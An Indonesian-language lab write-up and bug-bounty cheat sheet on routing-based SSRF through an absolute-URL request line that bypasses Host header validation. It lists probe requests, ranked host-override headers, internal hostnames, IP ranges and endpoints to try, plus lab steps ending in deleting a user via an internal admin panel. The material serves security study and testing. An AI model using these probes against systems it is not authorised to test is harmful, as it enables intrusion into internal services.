# SSRF via Flawed Request Parsing

## 📖 Konsep

Lab ini memanfaatkan **Routing-Based SSRF** yang disebabkan oleh **Flawed Request Parsing**.

Berbeda dengan lab sebelumnya yang langsung mempercayai **Host Header**, pada lab ini aplikasi **melakukan validasi Host Header** sehingga perubahan Host secara langsung akan ditolak.

Namun terdapat kelemahan karena **validator** dan **reverse proxy** mem-parsing request menggunakan sumber yang berbeda.

- Validator membaca **Host dari Absolute URL pada Request Line**
- Reverse Proxy membaca **Host Header**

Akibatnya attacker dapat melewati validasi tetapi tetap mengarahkan request ke internal server.

---

# ⚙️ Cara Kerja

```
Client
     │
     ▼
GET https://target.com/
Host: 192.168.0.10
     │
     ▼
Validator
     │
Membaca Request Line
     │
Host = target.com
     │
VALID
     │
     ▼
Reverse Proxy
     │
Membaca Host Header
     │
Host = 192.168.0.10
     │
     ▼
Internal Server
```

---

# 🧠 Root Cause

Terjadi **Parser Discrepancy**.

Dua komponen mem-parsing request dengan cara berbeda.

Validator:

```
GET https://target.com/
```

Sedangkan router membaca:

```
Host: 192.168.0.10
```

Akibatnya validasi lolos tetapi request tetap diarahkan menuju host internal.

---

# 🎯 Alur Serangan (Lab)

1. Kirim request normal.
2. Ubah Host Header.
3. Perhatikan server menolak request.
4. Gunakan Absolute URL pada Request Line.
5. Ganti Host dengan Burp Collaborator.
6. Konfirmasi HTTP Interaction.
7. Brute-force subnet internal.
8. Temukan Admin Panel.
9. Akses `/admin`.
10. Ambil CSRF Token.
11. Delete user.

---

# ❓ Kenapa Teknik Ini Berhasil?

Normalnya browser mengirim request seperti berikut.

```
GET / HTTP/1.1
Host: target.com
```

Tetapi HTTP juga mendukung **Absolute Form Request**.

```
GET https://target.com/ HTTP/1.1
Host: target.com
```

Format ini memang digunakan oleh:

- Forward Proxy
- Corporate Proxy
- Reverse Proxy
- Load Balancer

Masalah muncul ketika:

Validator membaca:

```
GET https://target.com/
```

Sedangkan router membaca:

```
Host:
```

Sehingga dua komponen memiliki hasil parsing berbeda.

---

# 🌍 Pendekatan Real Bug Bounty

Pada dunia nyata bug seperti ini cukup jarang dibanding Host Header Injection biasa.

Tetapi jika muncul biasanya impact cukup tinggi.

Yang perlu dicari bukan payloadnya, tetapi **indikasinya**.

---

# 🚩 Kapan Teknik Ini Dicoba?

## 1. Host Header Ditolak

Misalnya:

```
Host: localhost
```

Response:

```
400 Bad Request
```

atau

```
Invalid Host Header
```

Ini indikasi pertama.

---

## 2. Absolute URL Masih Diterima

Coba ubah request menjadi:

```
GET https://target.com/ HTTP/1.1
Host: localhost
```

Jika request tidak langsung ditolak,

berarti validator kemungkinan membaca Request Line.

Layak dilakukan pengujian lebih lanjut.

---

## 3. Target Menggunakan Reverse Proxy

Misalnya ditemukan:

```
Server: nginx
```

atau

```
Via:
```

atau

```
X-Forwarded-*
```

atau

```
X-Cache
```

atau

```
X-Served-By
```

Bukan berarti pasti vulnerable.

Tetapi parser discrepancy lebih sering muncul pada arsitektur seperti ini.

---

## 4. Aplikasi Menggunakan Absolute URL

Misalnya response mengandung:

```
Location:
```

atau HTML:

```
<link href="https://target.com">
```

atau

```
<script src="https://target.com">
```

Artinya aplikasi memang menggunakan Absolute URL.

---

# 🔍 Payload Umum

Request normal

```
GET / HTTP/1.1
Host: target.com
```

Absolute URL

```
GET https://target.com/ HTTP/1.1
Host: localhost
```

Menggunakan Burp Collaborator

```
GET https://target.com/ HTTP/1.1
Host: xxxx.burpcollaborator.net
```

---

# 📋 Header yang Wajib Dicoba

## 1. Host

```
Host: localhost
```

```
Host: 127.0.0.1
```

```
Host: admin.internal
```

⭐⭐⭐⭐⭐

---

## 2. X-Forwarded-Host

```
X-Forwarded-Host: localhost
```

```
X-Forwarded-Host: admin.internal
```

⭐⭐⭐⭐⭐

---

## 3. X-Original-Host

```
X-Original-Host: localhost
```

⭐⭐⭐⭐

---

## 4. Forwarded

```
Forwarded: host=localhost
```

```
Forwarded: host=127.0.0.1
```

⭐⭐⭐⭐

---

## 5. X-Host

```
X-Host: localhost
```

⭐⭐⭐

---

## 6. X-HTTP-Host-Override

```
X-HTTP-Host-Override: localhost
```

⭐⭐⭐

---

## 7. X-Forwarded-Server

```
X-Forwarded-Server: localhost
```

⭐⭐⭐

---

## 8. X-Original-URL

```
X-Original-URL: /admin
```

⭐⭐⭐

---

## 9. X-Rewrite-URL

```
X-Rewrite-URL: /admin
```

⭐⭐⭐

---

## 10. X-Forwarded-For

⚠️ Tidak digunakan untuk Routing-Based SSRF.

Biasanya digunakan untuk menguji:

```
X-Forwarded-For: 127.0.0.1
```

- IP Whitelist
- Trust Proxy
- Admin Only
- Rate Limit
- Logging

---

# 🌍 Real Hunting Methodology

Ketika hunting biasanya saya menggunakan alur berikut.

```
Request Normal
       │
       ▼
Host Injection
       │
       ▼
400 Bad Request?
       │
      Ya
       │
       ▼
Absolute URL
       │
       ▼
Collaborator Hit?
       │
      Ya
       │
       ▼
localhost
       │
       ▼
127.0.0.1
       │
       ▼
Private IP
       │
       ▼
Hostname Internal
       │
       ▼
Endpoint Internal
```

Jangan langsung brute-force subnet.

Konfirmasi terlebih dahulu bahwa request benar-benar diteruskan.

---

# 🎯 Target yang Biasanya Dicoba

Loopback

```
localhost
```

```
127.0.0.1
```

```
::1
```

Private IP

```
10.x.x.x
```

```
172.16.x.x
```

```
192.168.x.x
```

Hostname Internal

```
admin.internal
```

```
backend.internal
```

```
api.internal
```

```
grafana.internal
```

```
jenkins.internal
```

```
prometheus.internal
```

```
vault.internal
```

Kubernetes / Docker

```
admin
```

```
backend
```

```
api
```

```
grafana
```

```
prometheus
```

```
redis
```

```
elasticsearch
```

---

# 🎯 Endpoint Internal

```
/
```

```
/admin
```

```
/login
```

```
/dashboard
```

```
/health
```

```
/metrics
```

```
/status
```

```
/debug
```

```
/actuator
```

```
/swagger
```

```
/graphql
```

```
/api
```

---

# 🚩 Indikator Vulnerable

Perhatikan perubahan berikut.

Status berubah.

```
400
↓
Timeout
```

atau

```
404
↓
200
```

atau

```
404
↓
302
```

Atau Burp Collaborator menerima:

```
DNS
```

```
HTTP
```

Response Size berubah.

Header berubah.

Muncul halaman login internal.

---

# 🕵️ Hunting Checklist

✅ Host Injection

✅ Absolute URL

✅ Burp Collaborator

✅ X-Forwarded-Host

✅ X-Original-Host

✅ Forwarded

✅ X-Host

✅ X-HTTP-Host-Override

✅ localhost

✅ 127.0.0.1

✅ ::1

✅ Private IP

✅ Hostname Internal

✅ Endpoint Internal

✅ Bandingkan Status Code

✅ Bandingkan Response Size

---

# 📚 Pelajaran Lab

- HTTP mendukung Absolute URL pada Request Line.
- Reverse Proxy menggunakan format tersebut untuk melakukan routing.
- Parser Discrepancy terjadi ketika validator dan router membaca bagian request yang berbeda.
- Host Header dapat diblok tetapi request tetap dapat diarahkan ke host internal menggunakan Absolute URL.
- Burp Collaborator merupakan cara tercepat untuk membuktikan bahwa request benar-benar diteruskan.

---

# ⚡ Hafalan Cepat

```
Host Ditolak
        │
        ▼
Absolute URL
        │
        ▼
Validator
Baca Request Line
        │
        ▼
Reverse Proxy
Baca Host Header
        │
        ▼
Parser Discrepancy
        │
        ▼
Routing-Based SSRF
        │
        ▼
Admin Panel Internal
```

---

# 🔑 Inti Lab

## Bug Class

```
SSRF via Flawed Request Parsing
```

## Root Cause

```
Validator membaca Host dari Absolute URL.

Reverse Proxy membaca Host Header.

Terjadi Parser Discrepancy.
```

## Teknik Inti

```
Absolute URL Injection
```

## Header Utama

```
Host
```

## Header Tambahan

```
X-Forwarded-Host
X-Original-Host
Forwarded
X-Host
X-HTTP-Host-Override
X-Forwarded-Server
X-Original-URL
X-Rewrite-URL
```

## Target Umum

```
localhost
127.0.0.1
::1
10.x.x.x
172.16.x.x
192.168.x.x
admin.internal
backend.internal
api.internal
```

## Indikator

```
Host Ditolak

Absolute URL Diterima

Collaborator Hit

Status Berubah

Response Berubah
```

## Tahap Akhir

```
Parser Discrepancy
        │
        ▼
Routing Internal
        │
        ▼
Admin Panel
        │
        ▼
Eksploitasi
```
